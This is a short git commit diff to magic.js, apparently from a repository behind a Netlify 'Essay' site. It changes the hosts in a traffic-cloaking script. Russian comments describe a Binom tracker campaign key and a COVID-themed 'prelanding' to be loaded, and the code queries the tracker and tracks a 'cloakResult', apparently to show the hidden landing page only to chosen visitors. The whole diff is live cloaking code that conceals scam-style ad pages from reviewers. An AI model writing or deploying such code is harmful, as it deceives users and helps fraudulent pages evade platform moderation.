69e4c0267a5493562276bd336f70388cd4917e3c
graffexdomain-jpg <73432126+graffexdomain-jpg@users.noreply.github.com>
2020-11-07 09:00:36 +0800

    Update magic.js

--- magic.js
+++ magic.js
@@ -1,10 +1,10 @@
 var binomCampaingKey = 'qg15f8wf5z6hjqlp36rd'; /*Netlify _Essay, id:371. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
-var landingUrl = 'https://endemic-tours.000webhostapp.com/landing/covid_2/'; /*Адрес преленда, который необходимо подгрузить*/
+var landingUrl = 'https://sandwich.asia/frame.php?link=https://sandwich.asia/landing/covid_2/'; /*Адрес преленда, который необходимо подгрузить*/
 
 var landing = landingUrl;
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
 
-var url = 'https://endemic-tours.000webhostapp.com/binom/?bckey='+binomCampaingKey;
+var url = 'https://sandwich.asia/binom/?bckey='+binomCampaingKey;
 var xhr = new XMLHttpRequest();
 var cloakResult = 'no';
 
